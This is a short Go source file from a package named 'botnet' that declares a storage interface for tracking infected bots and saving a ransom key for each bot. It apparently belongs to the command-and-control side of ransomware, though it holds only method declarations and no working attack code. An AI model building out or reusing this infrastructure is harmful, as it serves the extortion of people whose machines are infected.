package botnet

//Storage is
type Storage interface {
	AddBot(b *Bot) (*Bot, error)
	RemoveBot(id []byte) error
	ListBots() ([]*Bot, error)
	GetBot(id []byte) (*Bot, error)
	AddRansomKey(botID, key []byte) error
	CreateTables() error
}
